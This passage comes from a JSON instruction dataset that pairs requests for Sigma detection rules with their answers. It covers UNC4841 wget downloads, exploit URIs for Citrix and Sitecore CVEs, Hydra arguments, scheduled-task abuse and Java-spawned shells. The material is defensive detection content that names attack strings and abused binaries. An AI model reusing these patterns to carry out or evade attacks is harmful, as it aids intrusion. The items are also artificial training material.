    "instruction": "Build a Sigma rule with the goal of detecting execution of \"wget\" to download a \"tar\" from an IP address that doesn't have a trusted certificate. As seen used by UNC4841 during their Barracuda ESG zero day exploitation..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of \"wget\" to download a \"tar\" from an IP address that doesn't have a trusted certificate, as seen used by UNC4841 during their Barracuda ESG zero-day exploitation, you should: \n\nMonitor Linux systems for the creation of processes involving the \"wget\" utility. Specifically, look for instances where \"wget\" is used to download files with a \".tar\" extension from IP addresses, indicated by a pattern that matches an IP format (e.g., 'https://192.168.0.1'). This attempt should raise suspicions especially when the command line includes the '--no-check-certificate' option, which is a workaround for SSL certificate verification. This scenario might indicate a security concern or a potential malicious activity similar to the tactics used by certain threat groups.\n\nAdditionally, to refine the detection and reduce noise from legitimate operations within an internal network, any downloads from common local IP ranges (such as 10.x.x.x, 172.16.x.x to 172.31.x.x, 192.168.x.x, 127.x.x.x, and 169.254.x.x) should be excluded from alerts unless otherwise desired. This approach focuses the detection on external and possibly malicious sources, aligning with observed attack patterns. \n\nThis monitoring strategy is crucial for identifying possibly malicious downloads via \"wget\" that could bypass SSL/TLS certificate validation, a method associated with specific cyber threat activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '/wget'\n        CommandLine|re: 'https://[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'\n        CommandLine|contains: '--no-check-certificate'\n        CommandLine|endswith: '.tar'\n    filter_main_local_ips:\n        # Note: Uncomment this filter if you want to exclude local IPs\n        CommandLine|contains:\n            - 'https://10.' #10.0.0.0/8\n            - 'https://192.168.' #192.168.0.0/16\n            - 'https://172.16.' #172.16.0.0/12\n            - 'https://172.17.'\n            - 'https://172.18.'\n            - 'https://172.19.'\n            - 'https://172.20.'\n            - 'https://172.21.'\n            - 'https://172.22.'\n            - 'https://172.23.'\n            - 'https://172.24.'\n            - 'https://172.25.'\n            - 'https://172.26.'\n            - 'https://172.27.'\n            - 'https://172.28.'\n            - 'https://172.29.'\n            - 'https://172.30.'\n            - 'https://172.31.'\n            - 'https://127.' #127.0.0.0/8\n            - 'https://169.254.' #169.254.0.0/16\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '/wget'\n        CommandLine|re: 'https://[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'\n        CommandLine|contains: '--no-check-certificate'\n        CommandLine|endswith: '.tar'\n    filter_main_local_ips:\n        # Note: Uncomment this filter if you want to exclude local IPs\n        CommandLine|contains:\n            - 'https://10.' #10.0.0.0/8\n            - 'https://192.168.' #192.168.0.0/16\n            - 'https://172.16.' #172.16.0.0/12\n            - 'https://172.17.'\n            - 'https://172.18.'\n            - 'https://172.19.'\n            - 'https://172.20.'\n            - 'https://172.21.'\n            - 'https://172.22.'\n            - 'https://172.23.'\n            - 'https://172.24.'\n            - 'https://172.25.'\n            - 'https://172.26.'\n            - 'https://172.27.'\n            - 'https://172.28.'\n            - 'https://172.29.'\n            - 'https://172.30.'\n            - 'https://172.31.'\n            - 'https://127.' #127.0.0.0/8\n            - 'https://169.254.' #169.254.0.0/16\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "execution of \"wget\" to download a \"tar\" from an IP address that doesn't have a trusted certificate. As seen used by UNC4841 during their Barracuda ESG zero day exploitation.",
      "answer": "In order to detect execution of \"wget\" to download a \"tar\" from an IP address that doesn't have a trusted certificate, as seen used by UNC4841 during their Barracuda ESG zero-day exploitation, you should: \n\nMonitor Linux systems for the creation of processes involving the \"wget\" utility. Specifically, look for instances where \"wget\" is used to download files with a \".tar\" extension from IP addresses, indicated by a pattern that matches an IP format (e.g., 'https://192.168.0.1'). This attempt should raise suspicions especially when the command line includes the '--no-check-certificate' option, which is a workaround for SSL certificate verification. This scenario might indicate a security concern or a potential malicious activity similar to the tactics used by certain threat groups.\n\nAdditionally, to refine the detection and reduce noise from legitimate operations within an internal network, any downloads from common local IP ranges (such as 10.x.x.x, 172.16.x.x to 172.31.x.x, 192.168.x.x, 127.x.x.x, and 169.254.x.x) should be excluded from alerts unless otherwise desired. This approach focuses the detection on external and possibly malicious sources, aligning with observed attack patterns. \n\nThis monitoring strategy is crucial for identifying possibly malicious downloads via \"wget\" that could bypass SSL/TLS certificate validation, a method associated with specific cyber threat activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation attempt against Citrix Netscaler, Application Delivery Controller (ADS) and Citrix Gateway exploiting vulnerabilities reported as CVE-2020-8193 and CVE-2020-8195.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation attempts against Citrix Netscaler, Application Delivery Controller (ADS), and Citrix Gateway exploiting vulnerabilities reported as CVE-2020-8193 and CVE-2020-8195, you should monitor web server logs for specific patterns in the URI query. Look for queries containing '/rapi/filedownload?filter=path:%2F'. Additionally, watch for queries that include all the following parameters: '/pcidss/report', 'type=all_signatures', and 'sig_name=_default_signature_'. These queries are potential indicators of an attack exploiting the mentioned CVE vulnerabilities. Ensure to capture the client IP, the virtual host, the full URL, and the response code for any request that matches these patterns. It is important to note that while this detection strategy is critical for identifying possible exploitation attempts, there might be unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection1:\n        cs-uri-query|contains: '/rapi/filedownload?filter=path:%2F'\n    selection2:\n        cs-uri-query|contains|all:\n            - '/pcidss/report'\n            - 'type=all_signatures'\n            - 'sig_name=_default_signature_'\n    condition: 1 of selection*\nfields:\n    - client_ip\n    - vhost\n    - url\n    - response\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection1:\n        cs-uri-query|contains: '/rapi/filedownload?filter=path:%2F'\n    selection2:\n        cs-uri-query|contains|all:\n            - '/pcidss/report'\n            - 'type=all_signatures'\n            - 'sig_name=_default_signature_'\n    condition: 1 of selection*\nfields:\n    - client_ip\n    - vhost\n    - url\n    - response\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "exploitation attempt against Citrix Netscaler, Application Delivery Controller (ADS) and Citrix Gateway exploiting vulnerabilities reported as CVE-2020-8193 and CVE-2020-8195",
      "answer": "In order to detect exploitation attempts against Citrix Netscaler, Application Delivery Controller (ADS), and Citrix Gateway exploiting vulnerabilities reported as CVE-2020-8193 and CVE-2020-8195, you should monitor web server logs for specific patterns in the URI query. Look for queries containing '/rapi/filedownload?filter=path:%2F'. Additionally, watch for queries that include all the following parameters: '/pcidss/report', 'type=all_signatures', and 'sig_name=_default_signature_'. These queries are potential indicators of an attack exploiting the mentioned CVE vulnerabilities. Ensure to capture the client IP, the virtual host, the full URL, and the response code for any request that matches these patterns. It is important to note that while this detection strategy is critical for identifying possible exploitation attempts, there might be unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may target user email on local systems to collect sensitive information.\nFiles containing email data can be acquired from a users local system, such as Outlook storage or cache files.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect attempts where adversaries target user email on local systems to collect sensitive information, which might involve accessing or manipulating Outlook storage or cache files on a user's local system, you should monitor Windows PowerShell script activity. Focus on identifying any PowerShell scripts that contain specific indications of such email targeting activities. These indications include the usage of 'Get-Inbox.ps1', referencing 'Microsoft.Office.Interop.Outlook', leveraging 'Microsoft.Office.Interop.Outlook.olDefaultFolders', or creating an Outlook application object using '-comobject outlook.application'. Ensure your system has Script Block Logging enabled to effectively capture and scrutinize PowerShell script executions that match these criteria. This monitoring is crucial since unauthorized access to or manipulation of email data can lead to significant data breaches or loss of sensitive information. Be aware that some legitimate activities might occasionally match these detection patterns, but such instances are unspecified. The severity level for this kind of detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'Get-Inbox.ps1'\n            - 'Microsoft.Office.Interop.Outlook'\n            - 'Microsoft.Office.Interop.Outlook.olDefaultFolders'\n            - '-comobject outlook.application'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'Get-Inbox.ps1'\n            - 'Microsoft.Office.Interop.Outlook'\n            - 'Microsoft.Office.Interop.Outlook.olDefaultFolders'\n            - '-comobject outlook.application'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Adversaries may target user email on local systems to collect sensitive information.\nFiles containing email data can be acquired from a users local system, such as Outlook storage or cache files.\n",
      "answer": "In order to detect attempts where adversaries target user email on local systems to collect sensitive information, which might involve accessing or manipulating Outlook storage or cache files on a user's local system, you should monitor Windows PowerShell script activity. Focus on identifying any PowerShell scripts that contain specific indications of such email targeting activities. These indications include the usage of 'Get-Inbox.ps1', referencing 'Microsoft.Office.Interop.Outlook', leveraging 'Microsoft.Office.Interop.Outlook.olDefaultFolders', or creating an Outlook application object using '-comobject outlook.application'. Ensure your system has Script Block Logging enabled to effectively capture and scrutinize PowerShell script executions that match these criteria. This monitoring is crucial since unauthorized access to or manipulation of email data can lead to significant data breaches or loss of sensitive information. Be aware that some legitimate activities might occasionally match these detection patterns, but such instances are unspecified. The severity level for this kind of detection is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries abusing the Windows Task Scheduler for the initial or recurring execution of malicious code, you should focus on monitoring PowerShell script activities, specifically targeting script block logging on Windows systems. This is crucial as script block logging must be enabled to catch the execution of specific cmdlets and methods that are often leveraged during such attacks.\n\nYour detection efforts should concentrate on identifying any use of PowerShell commands associated with the Task Scheduler, such as creating new scheduled tasks (`New-ScheduledTaskAction`, `New-ScheduledTaskTrigger`, `New-ScheduledTaskPrincipal`, `New-ScheduledTaskSettingsSet`, `New-ScheduledTask`) or registering these tasks (`Register-ScheduledTask`). Additionally, pay attention to instances where the `Invoke-CimMethod` command is used in conjunction with parameters pointing to the Task Scheduler, namely `-ClassName PS_ScheduledTask` and `-NameSpace Root\\Microsoft\\Windows\\TaskScheduler`. These commands and parameters are key indicators that an attacker might be attempting to schedule tasks for malicious purposes.\n\nIt's important to approach the monitoring of these indicators with an understanding that not all use of these commands is nefarious. However, in the context of detecting potential misuse of the Windows Task Scheduler for executing malicious code, these PowerShell cmdlets and CIM methods stand out as critical points of interest.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_cmdlet:\n        ScriptBlockText|contains:\n            - 'New-ScheduledTaskAction'\n            - 'New-ScheduledTaskTrigger'\n            - 'New-ScheduledTaskPrincipal'\n            - 'New-ScheduledTaskSettingsSet'\n            - 'New-ScheduledTask'\n            - 'Register-ScheduledTask'\n    selection_cimmethod:\n        ScriptBlockText|contains|all:\n            - 'Invoke-CimMethod'\n            - '-ClassName'\n            - 'PS_ScheduledTask'\n            - '-NameSpace'\n            - 'Root\\Microsoft\\Windows\\TaskScheduler'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_cmdlet:\n        ScriptBlockText|contains:\n            - 'New-ScheduledTaskAction'\n            - 'New-ScheduledTaskTrigger'\n            - 'New-ScheduledTaskPrincipal'\n            - 'New-ScheduledTaskSettingsSet'\n            - 'New-ScheduledTask'\n            - 'Register-ScheduledTask'\n    selection_cimmethod:\n        ScriptBlockText|contains|all:\n            - 'Invoke-CimMethod'\n            - '-ClassName'\n            - 'PS_ScheduledTask'\n            - '-NameSpace'\n            - 'Root\\Microsoft\\Windows\\TaskScheduler'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code",
      "answer": "In order to detect adversaries abusing the Windows Task Scheduler for the initial or recurring execution of malicious code, you should focus on monitoring PowerShell script activities, specifically targeting script block logging on Windows systems. This is crucial as script block logging must be enabled to catch the execution of specific cmdlets and methods that are often leveraged during such attacks.\n\nYour detection efforts should concentrate on identifying any use of PowerShell commands associated with the Task Scheduler, such as creating new scheduled tasks (`New-ScheduledTaskAction`, `New-ScheduledTaskTrigger`, `New-ScheduledTaskPrincipal`, `New-ScheduledTaskSettingsSet`, `New-ScheduledTask`) or registering these tasks (`Register-ScheduledTask`). Additionally, pay attention to instances where the `Invoke-CimMethod` command is used in conjunction with parameters pointing to the Task Scheduler, namely `-ClassName PS_ScheduledTask` and `-NameSpace Root\\Microsoft\\Windows\\TaskScheduler`. These commands and parameters are key indicators that an attacker might be attempting to schedule tasks for malicious purposes.\n\nIt's important to approach the monitoring of these indicators with an understanding that not all use of these commands is nefarious. However, in the context of detecting potential misuse of the Windows Task Scheduler for executing malicious code, these PowerShell cmdlets and CIM methods stand out as critical points of interest."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting command line parameters used by Hydra password guessing hack tool.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect command line parameters used by Hydra password guessing hack tool, you should look for process creation events on Windows systems where the command line includes certain patterns indicative of Hydra's usage. Specifically, look out for command line commands containing both '-u ' and '-p ' together. Additionally, watch for commands that include the keywords 'USER' and 'PASS', both surrounded by carets ('^'). These patterns are strongly associated with the attack method employed by the Hydra tool, which aims at guessing passwords through brute force or dictionary attacks. It is essential to be aware of potential false positives, which may arise from legitimate software that happens to use these keywords in its command line in a similar format. Given the high level of threat associated with this behavior, it's crucial to monitor for these indicators to effectively thwart attempts at unauthorized access through password guessing.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '-u '\n            - '-p '\n        CommandLine|contains:\n            - '^USER^'\n            - '^PASS^'\n    condition: selection\nfalsepositives:\n    - Software that uses the caret encased keywords PASS and USER in its command line\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '-u '\n            - '-p '\n        CommandLine|contains:\n            - '^USER^'\n            - '^PASS^'\n    condition: selection\nfalsepositives:\n    - Software that uses the caret encased keywords PASS and USER in its command line\nlevel: high\n",
      "question": "command line parameters used by Hydra password guessing hack tool",
      "answer": "In order to detect command line parameters used by Hydra password guessing hack tool, you should look for process creation events on Windows systems where the command line includes certain patterns indicative of Hydra's usage. Specifically, look out for command line commands containing both '-u ' and '-p ' together. Additionally, watch for commands that include the keywords 'USER' and 'PASS', both surrounded by carets ('^'). These patterns are strongly associated with the attack method employed by the Hydra tool, which aims at guessing passwords through brute force or dictionary attacks. It is essential to be aware of potential false positives, which may arise from legitimate software that happens to use these keywords in its command line in a similar format. Given the high level of threat associated with this behavior, it's crucial to monitor for these indicators to effectively thwart attempts at unauthorized access through password guessing."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting DNS-answer with TTL <10..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect DNS-answer with TTL <10, you should: monitor DNS logs for responses that have a TTL (Time to Live) less than 10 seconds, which can indicate suspicious or malicious activity. Specifically, focus on responses where any answer is provided (indicating a successful query response) and the TTL value for the response is greater than 0 but less than 10 seconds. Additionally, it is important to observe the rate at which these responses occur; if more than 3 such responses are identified coming from the same source IP address within a 30-second window, it warrants attention. The detection of such activity is considered to be of medium severity and aligns with tactics and techniques that involve the exploitation of DNS for command and control or other malicious purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: dns\ndetection:\n    selection:\n        answer: '*'\n    filter1:\n        ttl: '>0'\n    filter2:\n        ttl: '<10'\n    timeframe: 30s\n    condition: selection and filter1 and filter2 | count(answer) by src_ip > 3\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: dns\ndetection:\n    selection:\n        answer: '*'\n    filter1:\n        ttl: '>0'\n    filter2:\n        ttl: '<10'\n    timeframe: 30s\n    condition: selection and filter1 and filter2 | count(answer) by src_ip > 3\nlevel: medium\n",
      "question": "DNS-answer with TTL <10.",
      "answer": "In order to detect DNS-answer with TTL <10, you should: monitor DNS logs for responses that have a TTL (Time to Live) less than 10 seconds, which can indicate suspicious or malicious activity. Specifically, focus on responses where any answer is provided (indicating a successful query response) and the TTL value for the response is greater than 0 but less than 10 seconds. Additionally, it is important to observe the rate at which these responses occur; if more than 3 such responses are identified coming from the same source IP address within a 30-second window, it warrants attention. The detection of such activity is considered to be of medium severity and aligns with tactics and techniques that involve the exploitation of DNS for command and control or other malicious purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting default \"UserName\" used by the DiagTrackEoP POC.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the default \"UserName\" used by the DiagTrackEoP POC, you should monitor the security logs on Windows systems for specific activity patterns that match an attacker exploiting this point of compromise. Focus on scrutinizing events with the EventID 4624, which represents successful account logon events. Specifically, look for instances where the LogonType is set to 9, indicating a NewCredentials logon type, such as those used by runas with /netonly or by a Scheduled Task. An especially critical flag for this detection is the use of the TargetOutboundUserName set to 'thisisnotvaliduser'. This username is a distinct indicator of suspicious activity related to the DiagTrackEoP proof of concept (POC) attack. Given the nature of this detection, false positives are considered unlikely, and such events should be treated with a high level of scrutiny as they can indicate critical security breaches aligned with tactics and techniques observed in sophisticated cyber attacks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4624\n        LogonType: 9\n        TargetOutboundUserName: 'thisisnotvaliduser'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4624\n        LogonType: 9\n        TargetOutboundUserName: 'thisisnotvaliduser'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "default \"UserName\" used by the DiagTrackEoP POC",
      "answer": "In order to detect the default \"UserName\" used by the DiagTrackEoP POC, you should monitor the security logs on Windows systems for specific activity patterns that match an attacker exploiting this point of compromise. Focus on scrutinizing events with the EventID 4624, which represents successful account logon events. Specifically, look for instances where the LogonType is set to 9, indicating a NewCredentials logon type, such as those used by runas with /netonly or by a Scheduled Task. An especially critical flag for this detection is the use of the TargetOutboundUserName set to 'thisisnotvaliduser'. This username is a distinct indicator of suspicious activity related to the DiagTrackEoP proof of concept (POC) attack. Given the nature of this detection, false positives are considered unlikely, and such events should be treated with a high level of scrutiny as they can indicate critical security breaches aligned with tactics and techniques observed in sophisticated cyber attacks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation attempts of Sitecore Experience Platform Pre-Auth RCE CVE-2021-42237 found in Report.ashx.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation attempts of Sitecore Experience Platform Pre-Auth RCE CVE-2021-42237 found in Report.ashx, you should: Monitor web server logs for specific patterns of attack that signify unauthorized attempts to exploit the vulnerability in the Sitecore Experience Platform. Specifically, watch for POST requests to the '/sitecore/shell/ClientBin/Reporting/Report.ashx' URI. These requests must successfully complete with HTTP status code 200 to be considered as potential exploitation attempts. Be aware that some benign activities, like vulnerability scanning, might generate similar traffic patterns and could be mistakenly flagged as false positives. Therefore, it's essential to investigate flagged events to rule out legitimate activities. This approach is crucial for identifying and mitigating attempts to exploit this specific vulnerability, tagged with tactics and techniques such as Execution and Command and Control, within the environment.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        cs-method: 'POST'\n        cs-uri-query|contains: '/sitecore/shell/ClientBin/Reporting/Report.ashx'\n        sc-status: 200\n    condition: selection\nfalsepositives:\n    - Vulnerability Scanning\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection:\n        cs-method: 'POST'\n        cs-uri-query|contains: '/sitecore/shell/ClientBin/Reporting/Report.ashx'\n        sc-status: 200\n    condition: selection\nfalsepositives:\n    - Vulnerability Scanning\nlevel: high\n",
      "question": "exploitation attempts of Sitecore Experience Platform Pre-Auth RCE CVE-2021-42237 found in Report.ashx",
      "answer": "In order to detect exploitation attempts of Sitecore Experience Platform Pre-Auth RCE CVE-2021-42237 found in Report.ashx, you should: Monitor web server logs for specific patterns of attack that signify unauthorized attempts to exploit the vulnerability in the Sitecore Experience Platform. Specifically, watch for POST requests to the '/sitecore/shell/ClientBin/Reporting/Report.ashx' URI. These requests must successfully complete with HTTP status code 200 to be considered as potential exploitation attempts. Be aware that some benign activities, like vulnerability scanning, might generate similar traffic patterns and could be mistakenly flagged as false positives. Therefore, it's essential to investigate flagged events to rule out legitimate activities. This approach is crucial for identifying and mitigating attempts to exploit this specific vulnerability, tagged with tactics and techniques such as Execution and Command and Control, within the environment."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting failed sign-in due to user not meeting expected controls for adminitrators.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect failed sign-in due to user not meeting expected controls for administrators, you should: Implement a monitoring strategy using Azure's signinlogs service that focuses on identifying failed login attempts. This approach should screen for sign-in attempts that have a failure status and originate from locations or countries where your organization does not operate. Additionally, pay attention to sign-ins from IP addresses which are not recognized or approved by your organization, and those that involve devices (based on browser or operating system information) not sanctioned for use. It's crucial to adjust the criteria based on your specific environment, especially the definitions of unauthorized countries, IP addresses, and devices to minimize the chances of overlooking legitimate activities by administrators who may not adhere strictly to prescribed protocols. Be aware that there could be false positives, such as legitimate administrators using unapproved methods or devices; thus, a high level of scrutiny and customization for your environment before application is essential. Through implementing this monitoring, you're aligning with cybersecurity best practices to safeguard against unauthorized or suspicious attempts to access admin-level features or information, representing tactics typically associated with Initial Access and Persistence, including techniques like Valid Accounts and External Remote Services.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: signinlogs\ndetection:\n    # You have to tune the rule for your environment before use it\n    selection:\n        Status: failure\n        # Countries you do NOT operate out of e,g GB, use list for mulitple\n        Location: '%UnLegitCountries%'\n        IPaddress: '%UnApprovedIp%'\n        # unapproved browser, operating system\n        DeviceInfo: '%UnApprovedDevice%'\n    condition: selection\nfalsepositives:\n     - A legit admin not following proper processes\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: signinlogs\ndetection:\n    # You have to tune the rule for your environment before use it\n    selection:\n        Status: failure\n        # Countries you do NOT operate out of e,g GB, use list for mulitple\n        Location: '%UnLegitCountries%'\n        IPaddress: '%UnApprovedIp%'\n        # unapproved browser, operating system\n        DeviceInfo: '%UnApprovedDevice%'\n    condition: selection\nfalsepositives:\n     - A legit admin not following proper processes\nlevel: high\n",
      "question": "failed sign-in due to user not meeting expected controls for adminitrators",
      "answer": "In order to detect failed sign-in due to user not meeting expected controls for administrators, you should: Implement a monitoring strategy using Azure's signinlogs service that focuses on identifying failed login attempts. This approach should screen for sign-in attempts that have a failure status and originate from locations or countries where your organization does not operate. Additionally, pay attention to sign-ins from IP addresses which are not recognized or approved by your organization, and those that involve devices (based on browser or operating system information) not sanctioned for use. It's crucial to adjust the criteria based on your specific environment, especially the definitions of unauthorized countries, IP addresses, and devices to minimize the chances of overlooking legitimate activities by administrators who may not adhere strictly to prescribed protocols. Be aware that there could be false positives, such as legitimate administrators using unapproved methods or devices; thus, a high level of scrutiny and customization for your environment before application is essential. Through implementing this monitoring, you're aligning with cybersecurity best practices to safeguard against unauthorized or suspicious attempts to access admin-level features or information, representing tactics typically associated with Initial Access and Persistence, including techniques like Valid Accounts and External Remote Services."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious shell spawned from Java host process (e.g. log4j exploitation).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious shell spawned from Java host process (e.g., log4j exploitation), you should monitor for the creation of specific processes in the Windows environment. This involves looking for situations where a process traditionally associated with Java, such as 'java.exe', acts as a parent process to a variety of other potentially suspicious executables. These child executables include common command-line shells and utilities like 'sh.exe', 'bash.exe', 'powershell.exe', and 'pwsh.exe', among others that can be misused for malicious activities, for instance, 'schtasks.exe', 'certutil.exe', 'whoami.exe', etc. \n\nMonitoring should catch uses of administrative tools ('wmic.exe'), scripting environments ('cscript.exe', 'wscript.exe'), and other utilities that can be co-opted into malicious behavior ('curl.exe', 'systeminfo.exe'). This detection strategy is especially high-priority, given the likelihood of false positives is acknowledged; indeed, while many of these process creations could stem from legitimate administrative or developmental work, the specific pattern of being spawned by a Java process raises the risk they are part of an exploit attempt, such as leveraging the log4j vulnerabilities.\n\nTherefore, attention to the parent-child process relationships and the specific executable names in the Windows process creation logs is crucial. Additionally, while scrutinizing these logs, it's important to consider normal use cases within the specific environment to minimize the impact of potential false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\java.exe'\n        Image|endswith:\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\schtasks.exe'\n            - '\\certutil.exe'\n            - '\\whoami.exe'\n            - '\\bitsadmin.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\scrcons.exe'\n            - '\\regsvr32.exe'\n            - '\\hh.exe'\n            - '\\wmic.exe'        # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\forfiles.exe'\n            - '\\scriptrunner.exe'\n            - '\\mftrace.exe'\n            - '\\AppVLP.exe'\n            - '\\curl.exe'\n            - '\\systeminfo.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\reg.exe'\n            - '\\query.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate calls to system binaries\n    - Company specific internal usage\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\java.exe'\n        Image|endswith:\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\schtasks.exe'\n            - '\\certutil.exe'\n            - '\\whoami.exe'\n            - '\\bitsadmin.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\scrcons.exe'\n            - '\\regsvr32.exe'\n            - '\\hh.exe'\n            - '\\wmic.exe'        # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\mshta.exe'\n            - '\\rundll32.exe'\n            - '\\forfiles.exe'\n            - '\\scriptrunner.exe'\n            - '\\mftrace.exe'\n            - '\\AppVLP.exe'\n            - '\\curl.exe'\n            - '\\systeminfo.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n            - '\\reg.exe'\n            - '\\query.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate calls to system binaries\n    - Company specific internal usage\nlevel: high\n",
      "question": "suspicious shell spawned from Java host process (e.g. log4j exploitation)",
      "answer": "In order to detect suspicious shell spawned from Java host process (e.g., log4j exploitation), you should monitor for the creation of specific processes in the Windows environment. This involves looking for situations where a process traditionally associated with Java, such as 'java.exe', acts as a parent process to a variety of other potentially suspicious executables. These child executables include common command-line shells and utilities like 'sh.exe', 'bash.exe', 'powershell.exe', and 'pwsh.exe', among others that can be misused for malicious activities, for instance, 'schtasks.exe', 'certutil.exe', 'whoami.exe', etc. \n\nMonitoring should catch uses of administrative tools ('wmic.exe'), scripting environments ('cscript.exe', 'wscript.exe'), and other utilities that can be co-opted into malicious behavior ('curl.exe', 'systeminfo.exe'). This detection strategy is especially high-priority, given the likelihood of false positives is acknowledged; indeed, while many of these process creations could stem from legitimate administrative or developmental work, the specific pattern of being spawned by a Java process raises the risk they are part of an exploit attempt, such as leveraging the log4j vulnerabilities.\n\nTherefore, attention to the parent-child process relationships and the specific executable names in the Windows process creation logs is crucial. Additionally, while scrutinizing these logs, it's important to consider normal use cases within the specific environment to minimize the impact of potential false positives."
    }
  },
